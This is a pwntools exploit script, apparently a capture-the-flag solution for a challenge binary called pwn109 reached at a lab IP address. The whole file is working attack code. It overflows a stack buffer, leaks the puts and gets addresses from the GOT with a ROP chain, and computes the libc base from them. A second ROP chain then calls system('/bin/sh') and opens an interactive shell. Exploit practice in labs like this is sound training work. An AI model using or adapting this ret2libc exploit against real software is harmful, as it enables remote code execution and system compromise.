
from pwn import *

elf = context.binary = ELF('./pwn109-1644300507645.pwn109', checksec=False)
context.log_level = 'debug'

libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so')

# io = process()
io = remote('10.10.214.74', 9009)

ret = p64(0x40101a)
offset = 40
pop_rdi = p64(0x4012a3)



# Build payload for puts plt leak address

plt_puts = p64(elf.plt['puts'])
got_puts = p64(elf.got['puts'])
got_gets = p64(elf.got['gets'])


payload = b'A'*offset
payload += ret
payload += pop_rdi + got_puts + plt_puts
payload += pop_rdi + got_gets + plt_puts
payload += p64(elf.sym['main'])

io.recvuntil('Go ahead \xf0\x9f\x98\x8f')
io.sendline(payload)

io.recvline()

got_puts = unpack(io.recv(6).ljust(8,b'\x00'))
log.success(f'Puts Leaked: {hex(got_puts)}')

io.recvline()


got_gets = unpack(io.recv(6).ljust(8,b'\x00'))
log.success(f'Gets Leaked: {hex(got_gets)}')


# Calculate Base address

libc.address = got_gets - libc.sym['gets']
log.success(f'Base Address: {hex(libc.address)}')



# ROP chain to call system and binsh

rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))

payload2 = flat(
	b'A' * offset,
	ret,
	rop.chain()
)

io.sendline(payload2)

io.interactive()